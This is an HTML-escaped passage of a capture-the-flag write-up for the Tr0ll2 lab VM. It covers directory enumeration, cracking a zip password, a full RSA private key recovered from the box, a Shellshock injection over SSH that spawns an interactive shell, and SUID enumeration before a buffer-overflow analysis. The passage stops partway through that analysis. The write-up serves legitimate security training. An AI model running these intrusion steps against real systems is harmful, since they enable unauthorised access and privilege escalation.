&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the time to decompress this asks a password, the same that we don’t know.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip lmao.zip 
Archive:  lmao.zip
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;lmao.zip] noob password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: noob                    incorrect password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;

&lt;p&gt;Browsing the home page this only contains an image.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By listing the robots.txt file, a list of possible web directories was discovery.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We download and copy the directory names to a file on the attacking machine.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.179.183/robots.txt | &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 2 | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; +3 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dirs.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Then, we try to brute force with dirsearch to discover existing directories.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dirsearch &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://192.168.179.183/ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /root/tr0ll2/dirs.txt
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:49:06] 301 -  317B  - /noob  -&amp;gt;  http://192.168.179.183/noob/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:49:06] 301 -  324B  - /keep_trying  -&amp;gt;  http://192.168.179.183/keep_trying/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:49:06] 301 -  324B  - /dont_bother  -&amp;gt;  http://192.168.179.183/dont_bother/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;21:49:06] 301 -  326B  - /ok_this_is_it  -&amp;gt;  http://192.168.179.183/ok_this_is_it/
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the output we can see that the tool found four directories, but these contain the same image as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We need to download the images, possibly these contain some valuable information, we save the directories found in a file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;noob&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;keep_trying&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dont_bother&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ok_this_is_it&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; img-dirs.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I have written a bash script to automatically download the images.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.179.183&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;download&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
	&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read dirs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
		&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt;/&lt;span class=&quot;nv&quot;&gt;$dirs&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;'.*'&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;'&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $2}'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Downloading image&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.jpg&quot;&lt;/span&gt;
		&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1
		wget &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dirs&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$img&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; images/image&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;.jpg
		&lt;span class=&quot;nv&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$((&lt;/span&gt;c+1&lt;span class=&quot;k&quot;&gt;))&lt;/span&gt;	
	&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; &amp;lt; img-dirs.txt
	&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Done.&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; images &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
	&lt;/span&gt;download
&lt;span class=&quot;k&quot;&gt;else
	&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Creating directory..&quot;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;1
	&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;images
	download
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We run the script, the images will be download into a directory called images.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash download-img.sh
Creating directory..
Downloading image1.jpg
Downloading image2.jpg
Downloading image3.jpg
Downloading image4.jpg
Done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Analyzing the images with the &lt;strong&gt;strings&lt;/strong&gt; utility, the image number three contains a message at the end of the content.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;images | &lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Analyzing &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;2&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; strings images/&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt; | less&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings images/image3.jpg | &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;
Look Deep within y0ur_self &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the answer
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We use the browser to search the content in the &lt;strong&gt;y0ur_self&lt;/strong&gt; directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see the answer.txt file contains a large list of words in base64.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/tr0ll2/screenshot-11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We decode the words in base64 and save them to a file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.179.183/y0ur_self/answer.txt&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; b64decode.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We crack the zip file with fcrackzip using the decoded words in base64.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;fcrackzip &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; b64decode.txt lmao.zip  


PASSWORD FOUND!!!!: pw &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; ItCantReallyBeThisEasyRightLOL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We unzip the &lt;strong&gt;lmao.zip&lt;/strong&gt; file.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unzip lmao.zip
Archive:  lmao.zip
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;lmao.zip] noob password: 
  inflating: noob
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;strong&gt;noob&lt;/strong&gt; file contains a private key, we can login with this via SSH.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;noob 
&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
&lt;span class=&quot;nv&quot;&gt;zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;h3 id=&quot;access-via-ssh&quot;&gt;Access via SSH&lt;/h3&gt;

&lt;p&gt;We login through SSH as user noob, but we don’t have a shell, the server closes us the connection.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; noob &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; noob 192.168.179.183
TRY HARDER LOL!
Connection to 192.168.179.183 closed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As is an old version of SSH is possible that this ubuntu version to be vulnerable to shellshock.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; noob &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; noob 192.168.179.183 &lt;span class=&quot;s1&quot;&gt;'() { :;}; echo hello;id'&lt;/span&gt;
hello
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;noob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;noob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;noob&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As we saw earlier, it is vulnerable to shellshock and we can bypass the system restriction and execute commands.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; noob &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; noob 192.168.179.183 &lt;span class=&quot;s1&quot;&gt;'() { :;}; echo hello;bash -i'&lt;/span&gt;
hello
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
noob@Tr0ll2:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Listing the SUID binaries three suspect files were found.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;s &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; 2&amp;gt;/dev/null
...
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 7271 Oct  4  2014 /nothing_to_see_here/choose_wisely/door2/r00t
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 7273 Oct  5  2014 /nothing_to_see_here/choose_wisely/door3/r00t
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 8401 Oct  5  2014 /nothing_to_see_here/choose_wisely/door1/r00t
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We see three files, perhaps a means of privilege escalation via buffer overflow.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /nothing_to_see_here/choose_wisely/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;         
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /nothing_to_see_here/choose_wisely/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
/nothing_to_see_here/choose_wisely/door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 7271 Oct  4  2014 r00t

/nothing_to_see_here/choose_wisely/door2:
total 20
drwsr-xr-x 2 root root 4096 Oct  5  2014 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 8401 Oct  5  2014 r00t

/nothing_to_see_here/choose_wisely/door3:
total 16
drwsr-xr-x 2 root root 4096 Oct  5  2014 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 7273 Oct  5  2014 r00t
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We copy the binary of the door2 to the current working directory to analyze it, since the binaries every certain period of time change their gate.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /nothing_to_see_here/choose_wisely/door2/r00t &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We check if gdb is installed.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;which gdb
which gdb
/usr/bin/gdb
noob@Tr0ll2:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the &lt;strong&gt;file&lt;/strong&gt; command we can verify that it is a 32-bit binary.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file r00t
file r00t
r00t: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;uses shared libs&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x438546c50f77d4bac3e0c41b4f8bcd60899c4006, not stripped
noob@Tr0ll2:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The ASLR protection is disabled.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /proc/sys/kernel/randomize_va_space 
0
noob@Tr0ll2:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;h3 id=&quot;setuid-binary&quot;&gt;SETUID Binary&lt;/h3&gt;

&lt;p&gt;We disassemble the r00t binary with gdb, and list the functions.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;noob@Tr0ll2:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./r00t
gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./r00t
Reading symbols from /home/noob/r00t...done.
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; info functions
All defined functions:

File bof.c:
